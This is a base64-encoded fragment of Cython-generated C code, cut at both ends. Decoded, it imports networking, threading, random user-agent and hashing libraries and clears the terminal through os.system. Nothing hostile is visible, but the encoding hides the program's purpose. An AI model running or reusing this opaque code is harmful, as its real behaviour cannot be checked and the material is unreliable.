fX1B5eF9tb2Rpbml0X3ZhcmlhYmxlX2ltcG9ydF9jb2RlKF9fcHl4X21zdGF0ZSk7CiAgKHZvaWQpX19QeXhfbW9kaW5pdF9mdW5jdGlvbl9pbXBvcnRfY29kZShfX3B5eF9tc3RhdGUpOwogIAoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9QeUxpc3RfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVGhyZWFkUG9vbEV4ZWN1dG9yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXNfY29tcGxldGVkKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb25jdXJyZW50X2Z1dHVyZXMsIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8zLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfVGhyZWFkUG9vbEV4ZWN1dG9yKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9UaHJlYWRQb29sRXhlY3V0b3IsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAyLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2FzX2NvbXBsZXRlZCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXNfY29tcGxldGVkLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXMsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8zID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2dlbmVyYXRlX3VzZXJfYWdlbnQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnQoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJfYWdlbnRfMiwgX19weXhfdF8zLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CiAgX19weXhfdF8zID0gX19QeXhfSW1wb3J0RnJvbShfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZW5lcmF0ZV91c2VyX2FnZW50KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IsIF9fcHl4X3RfMykgPCAoMCkpIF9fUFlYX0VSUigwLCA0LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2ZvbnRzLCBfX3B5eF90XzIsIDApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCA1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlbmRlcik7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDUsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmVuZGVyLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgNSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHl0eiwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzMpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcHl0eiwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlcXVlc3RzLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgNywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZXF1ZXN0cywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICBfX3B5eF90XzMgPSBfX1B5eF9QeUxpc3RfUGFjaygyLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0KF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yYW5kb20sIF9fcHl4X3RfMywgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfY2hvaWNlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jYywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydEZyb20oX19weXhfdF8yLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZHJhbmdlKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgOCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yciwgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RocmVhZGluZywgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGhyZWFkaW5nLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3RyaW5nLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTAsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3dlYmJyb3dzZXIsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMikpIF9fUFlYX0VSUigwLCAxMSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMik7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV93ZWJicm93c2VyLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3JlLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTIsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMiwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfaGFzaGxpYiwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDEzLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hhc2hsaWIsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxMywgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CgogIAogIF9fcHl4X3RfMiA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfcmFuZG9tLCBfX3B5eF90XzIpIDwgKDApKSBfX1BZWF9FUlIoMCwgMTQsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzIpOyBfX3B5eF90XzIgPSAwOwoKICAKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnREb3R0ZWRNb2R1bGUoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jhc2U2NCwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF8yKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfZCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2Jhc2U2NCwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE1LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV91dWlkLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTYsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdXVpZCwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE2LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTcsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfanNvbiwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE3LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfSW1wb3J0RG90dGVkTW9kdWxlKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV90aW1lLCBOVUxMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTgsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfdGltZSwgX19weXhfdF8yKSA8ICgwKSkgX19QWVhfRVJSKDAsIDE4LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKCiAgCiAgX19weXhfdF8yID0gX19QeXhfUHlMaXN0X1BhY2soMSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZXRpbWUsIF9fcHl4X3RfMiwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF8zKSkgX19QWVhfRVJSKDAsIDE5LCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9HT1RSRUYoX19weXhfdF8zKTsKICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICBfX3B5eF90XzIgPSBfX1B5eF9JbXBvcnRGcm9tKF9fcHl4X3RfMywgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2RhdGV0aW1lKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMTksIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzIpOwogIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9kLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0ZXRpbWUsIF9fcHl4X3RfMikgPCAoMCkpIF9fUFlYX0VSUigwLCAxOSwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMik7IF9fcHl4X3RfMiA9IDA7CiAgX19QeXhfREVDUkVGKF9fcHl4X3RfMyk7IF9fcHl4X3RfMyA9IDA7CgogIAogIF9fcHl4X3RfMyA9IF9fUHl4X0ltcG9ydERvdHRlZE1vZHVsZShfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfb3MsIE5VTEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMykpIF9fUFlYX0VSUigwLCAyMCwgX19weXhfTDFfZXJyb3IpCiAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2QsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcywgX19weXhfdF8zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDIwLCBfX3B5eF9MMV9lcnJvcikKICBfX1B5eF9ERUNSRUYoX19weXhfdF8zKTsgX19weXhfdF8zID0gMDsKCiAgCiAgX19weXhfdF8yID0gTlVMTDsKICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3lzdGVtKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKQogIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpOwogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogIF9fcHl4X3RfNiA9IDE7CiAgewogICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2NsZWFyfTsKICAgIF9fcHl4X3RfMyA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrX19weXhfdF82LCAoMi1fX3B5eF90XzYpIHwgKF9fcHl4X3RfNipfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzMpKSBfX1BZWF9FUlIoMCwgMjEsIF9fcHl4X0wxX2Vycm9yKQogICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMyk7CiAgfQogIF9fUHl4X0RFQ1JFRihfX3B5eF90XzMpOyBfX3B5eF90XzMgPSAwOwoKICAKICB7CiAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICBfX1B5eF9FeGNlcHRpb25TYXZlKCZfX3B5eF90XzEsICZfX3B5eF90XzcsICZfX3B5eF90XzgpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzgpOwogICAgIHsKCiAgICAgIAogICAgICBfX3B5eF90XzUgPSBOVUxMOwogICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29zKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzIpKSBfX1BZWF9FUlIoMCwgMjMsIF9fcHl4X0wyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8yKTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF90XzIsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zeXN0ZW0pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDJfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8yKTsgX19weXhfdF8yID0gMDsKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzksIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9vcyk7IGlmICh1bmxpa2VseSghX19weXhfdF85KSkgX19QWVhfRVJSKDAsIDIzLCBfX3B5eF9MMl9lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfOSk7CiAgICAgIF9fcHl4X3RfMTAgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X25hbWUpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMjMsIF9fcHl4X0wyX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMCk7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzkpOyBfX3B5eF90XzkgPSAwOwogICAgICBfX3B5eF90XzExID0gKF9fUHl4X1B5VW5pY29kZV9FcXVhbHMoX19weXhfdF8xMCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X250LCBQeV9ORSkpOyBpZiAodW5saWtlbHkoKF9fcHl4X3RfMTEgPCAwKSkpIF9fUFlYX0VSUigwLCAyMywgX19weXhfTDJfZXJyb3IpCiAgICAg